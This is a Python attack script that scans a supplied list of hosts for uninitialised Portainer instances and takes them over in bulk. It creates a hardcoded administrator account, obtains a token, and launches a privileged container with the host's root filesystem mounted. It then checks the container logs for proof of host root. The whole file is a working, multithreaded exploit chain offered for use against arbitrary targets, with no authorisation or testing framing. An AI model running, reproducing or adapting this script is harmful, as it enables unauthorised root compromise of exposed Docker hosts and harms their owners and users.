#!/usr/bin/env python3
"""Portainer uninitialised-instance takeover -> host root.

Chain:
  GET  /api/users/admin/check        -> 404  (no admin yet)
  POST /api/users/admin/init         -> create admin
  POST /api/auth                     -> JWT
  GET  /api/endpoints                -> local docker endpoint id
  POST /api/endpoints/{id}/docker/containers/create  (Binds /:/host, Privileged)
  POST .../start ; GET .../logs      -> uid=0 proof

Reads "ip:port" lines (9000 http / 9443 https).
"""
import sys, json, time, re, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests, urllib3
urllib3.disable_warnings()

T = 15
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126 Safari/537.36"}
ADMIN = "kopsadmin"
PASS = "K0ps!Base#2026x"

def api(base, path, method="GET", tok=None, **kw):
    h = dict(UA)
    if tok:
        h["Authorization"] = "Bearer " + tok
    try:
        return requests.request(method, base + path, headers=h, timeout=T,
                                verify=False, allow_redirects=False, **kw)
    except Exception:
        return None

def probe(host):
    port = host.rsplit(":", 1)[-1]
    schemes = ["https"] if port in ("9443", "443") else ["http", "https"]
    for scheme in schemes:
        base = f"{scheme}://{host}"
        r = api(base, "/api/users/admin/check")
        if r is None:
            continue
        if r.status_code == 204:
            return {"host": host, "product": "portainer", "scheme": scheme,
                    "state": "admin_exists"}
        if r.status_code == 404:
            return {"host": host, "product": "portainer", "scheme": scheme,
                    "state": "UNINITIALISED"}
        # some versions return 200 on the status endpoint
        r2 = api(base, "/api/status")
        if r2 is not None and r2.status_code == 200 and "Version" in (r2.text or ""):
            return {"host": host, "product": "portainer", "scheme": scheme,
                    "state": "status_only"}
    return None

def takeover(host, scheme):
    base = f"{scheme}://{host}"
    out = {"host": host, "scheme": scheme}
    r = api(base, "/api/users/admin/init", "POST",
            json={"Username": ADMIN, "Password": PASS})
    if r is None or r.status_code not in (200, 201, 204):
        out["error"] = f"init {getattr(r,'status_code',None)}"
        return out
    out["admin_created"] = True
    a = api(base, "/api/auth", "POST", json={"Username": ADMIN, "Password": PASS})
    if a is None or a.status_code != 200:
        out["error"] = f"auth {getattr(a,'status_code',None)}"
        return out
    tok = (a.json() or {}).get("jwt")
    if not tok:
        out["error"] = "no jwt"
        return out
    out["jwt"] = tok[:20] + "…"
    eps = api(base, "/api/endpoints", tok=tok)
    eid = None
    if eps is not None and eps.status_code == 200:
        try:
            lst = eps.json()
            if lst:
                eid = lst[0].get("Id")
                out["endpoint"] = lst[0].get("Name")
        except Exception:
            pass
    if not eid:
        # create a local endpoint (admin can)
        ce = api(base, "/api/endpoints", "POST", tok=tok,
                 json={"Name": "local", "URL": "unix:///var/run/docker.sock",
                       "EndpointCreationType": 1})
        if ce is not None and ce.status_code in (200, 201):
            try:
                eid = (ce.json() or {}).get("Id")
            except Exception:
                pass
    if not eid:
        out["error"] = "no endpoint"
        return out
    out["endpoint_id"] = eid
    name = "kops" + str(int(time.time()))[-6:]
    body = {
        "Image": "alpine:latest",
        "Cmd": ["/bin/sh", "-c",
                "id; hostname; cat /host/etc/hostname 2>/dev/null; "
                "ls /host/root 2>/dev/null | head -3; head -2 /host/etc/os-release 2>/dev/null"],
        "HostConfig": {"Binds": ["/:/host"], "Privileged": True, "AutoRemove": True},
    }
    c = api(base, f"/api/endpoints/{eid}/docker/containers/create?name={name}",
            "POST", tok=tok, json=body)
    if c is None or c.status_code not in (200, 201):
        out["error"] = f"create {getattr(c,'status_code',None)} {(c.text if c else '')[:80]}"
        return out
    cid = (c.json() or {}).get("Id")
    out["container"] = cid[:16] if cid else None
    api(base, f"/api/endpoints/{eid}/docker/containers/{cid}/start", "POST", tok=tok)
    time.sleep(4)
    lg = api(base, f"/api/endpoints/{eid}/docker/containers/{cid}/logs?stdout=1&stderr=1", tok=tok)
    txt = (lg.text if lg else "") or ""
    if "uid=0" in txt:
        out["proof"] = "HOST ROOT"
        out["evidence"] = re.sub(r"[^\x20-\x7e\n]", "", txt)[:300]
    return out

def main():
    path = sys.argv[1]
    hosts = [l.strip() for l in open(path) if l.strip()]
    res, proven = [], []
    lock = threading.Lock()
    def work(h):
        p = probe(h)
        if not p:
            return None
        if p.get("state") == "UNINITIALISED":
            t = takeover(h, p["scheme"])
            p.update(t)
            return p
        return p
    with ThreadPoolExecutor(max_workers=100) as ex:
        for f in as_completed([ex.submit(work, h) for h in hosts]):
            try:
                r = f.result()
            except Exception:
                r = None
            if r:
                with lock:
                    res.append(r)
                if r.get("proof"):
                    with lock:
                        proven.append(r)
                    print(f"🔥 {json.dumps(r)[:400]}", flush=True)
                elif r.get("state") == "UNINITIALISED":
                    print(f"   ⚠ uninit {r['host']} {r.get('error','')}", flush=True)
    json.dump({"found": res, "proven": proven}, open("/tmp/portainer_result.json", "w"), indent=1)
    print(f"\nportainer: found={len(res)} proven={len(proven)}", flush=True)

if __name__ == "__main__":
    main()
